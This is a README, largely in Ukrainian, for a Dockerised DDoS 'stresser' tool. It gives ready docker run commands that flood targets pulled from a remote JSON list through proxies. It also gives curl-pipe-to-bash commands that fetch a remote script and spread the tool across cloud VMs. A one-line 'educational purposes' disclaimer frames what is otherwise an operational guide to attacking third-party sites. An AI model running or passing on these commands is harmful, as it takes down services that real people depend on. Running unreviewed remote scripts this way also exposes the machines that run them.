# stresser

## This program is made only for educational purposes only and test stressing. Any illegal usage of the program is discouraged.

### Переваги
- Підгружає цілі та проксі динамічно із вказаних прапорцями джерел (--proxy, --sites)
- Якщо є зміни в джерелах, програма їх бачить підвантажує оновлені дані
- Перевіряє на валідність цілі та резолвить хости перед атакою (DNS resolution)
- Перевіряє на валідність проксі
- Не вижирає багато пам'яті (ідеально для мікро-інстансів)
- Багатопотоковість з одного контейнера
- Розумний вибір цілей: якщо ціль лежить або не відповідає -- перестаємо колупати
- Для запуску потрібен лише Docker
- Україномовна із детальними логами, що пояснюють роботу

```bash
docker run --rm -it lovefromukraine/antiprop --refresh=20 \
--dnsres=true --errcount=9 --onlyproxy=false --bots 10 --checkproxy=true \
--sites https://raw.githubusercontent.com/meddion/stresser/sources/targets.json \
--proxy https://raw.githubusercontent.com/meddion/stresser/sources/proxy.json
```

Запустити у фоновому режимі:
```bash
docker run -d --restart=always --name=antiprop lovefromukraine/antiprop --refresh=20 \
--dnsres=true --errcount=9 --onlyproxy=false --bots 10 --checkproxy=true \
--sites https://raw.githubusercontent.com/meddion/stresser/sources/targets.json \
--proxy https://raw.githubusercontent.com/meddion/stresser/sources/proxy.json
```
Щоб побачити логи
```bash
docker logs antiprop -f
```
Щоб вбити програму
```bash
docker rm -f antiprop
```

### Запуск в GCP VMs / Run in GCP VMs
[Antiprop on Docker Hub](https://hub.docker.com/repository/docker/lovefromukraine/antiprop)

Дивись файл micro_vms_gcp.sh / Look into micro_vms_gcp.sh
```bash
curl https://raw.githubusercontent.com/meddion/stresser/main/micro_vms_gcp.sh | bash -s 10 
```
Запуск із власними джерелами
```bash
curl https://raw.githubusercontent.com/meddion/stresser/main/micro_vms_gcp.sh | bash -s 10 \
<URL_TARGETS_JSON_ARRAY> \
<URL_PROXY_JSON_ARRAY>
```
![image](https://user-images.githubusercontent.com/25509048/156889923-0a3bd42b-5ee0-466c-8e48-b8295cead812.png)

### Використання / Usage
```bash
docker run --rm lovefromukraine/antiprop --help
```
